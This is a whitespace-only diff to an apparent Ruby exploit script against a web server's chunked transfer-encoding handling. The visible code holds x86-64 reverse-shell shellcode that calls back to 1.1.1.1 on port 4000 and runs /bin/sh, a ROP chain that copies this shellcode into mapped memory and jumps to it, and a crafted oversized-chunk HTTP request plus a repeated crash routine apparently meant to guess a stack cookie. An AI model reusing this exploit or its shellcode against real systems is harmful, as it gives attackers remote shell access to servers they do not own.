@@ -45,17 +45,19 @@ ip = "1.1.1.1"
 port = 4000
 sip = IPAddr::new(ip).to_i.pack(:int_be)
 sport = port.pack(:int16_be)
+
 $shellcode  = "\x48\x31\xd2\x48\x31\xc0\xb2\x02\x48\x89\xd7\xb2\x01\x48\x89\xd6\xb2\x06\xb0\x29\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\xbb#{sip}\x48\xc1\xe3\x20\x66\xb8#{sport}\xc1\xe0\x10\xb0\x02\x48\x09\xd8\x50\x48\x89\xe6\x48\x31\xd2\xb2\x10\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xf6\x48\x31\xc0\xb0\x21\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xf6\x48\x31\xd2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05\xc3"
 
 $shellcode << ("\x90" * (8 - ($shellcode.length % 8)))
 
 # copy the shellcode to mmapaddr
 (0...$shellcode.length).step(8) { |p|
-    code = $shellcode[p,8].unpack(:uint64)[0]
-    chain = [poprax, mmapaddr + p, poprsi, code, rsito_rax_].pack(
-      :uint64, :uint64, :uint64, :uint64, :uint64
-    )
-    $ropchain << chain
+  code  = $shellcode[p,8].unpack(:uint64)[0]
+  chain = [poprax, mmapaddr + p, poprsi, code, rsito_rax_].pack(
+    :uint64, :uint64, :uint64, :uint64, :uint64
+  )
+
+  $ropchain << chain
 }
 
 # finally jump to it
@@ -63,18 +65,20 @@ $ropchain << mmapaddr.pack(:uint64)
 
 # payload for crash
 $payload = [ 
-   "GET / HTTP/1.1\r\n",
-   "Host: 1337.vnsec.net\r\n",
-   "Accept: */*\r\n",
-   "Transfer-Encoding: chunked\r\n\r\n"
+  "GET / HTTP/1.1\r\n",
+  "Host: 1337.vnsec.net\r\n",
+  "Accept: */*\r\n",
+  "Transfer-Encoding: chunked\r\n\r\n"
 ].join
 $chunk = "f"*(1024-$payload.length-8) + "0f0f0f0f"
 $payload << $chunk
 
 def crash(cookie, cookie_test=true)
   data = ''
+
   5.times do
     payload = $payload
+
     tcp_session(ARGV[0],ARGV[1].to_i) do |s|
       $count += 1
 
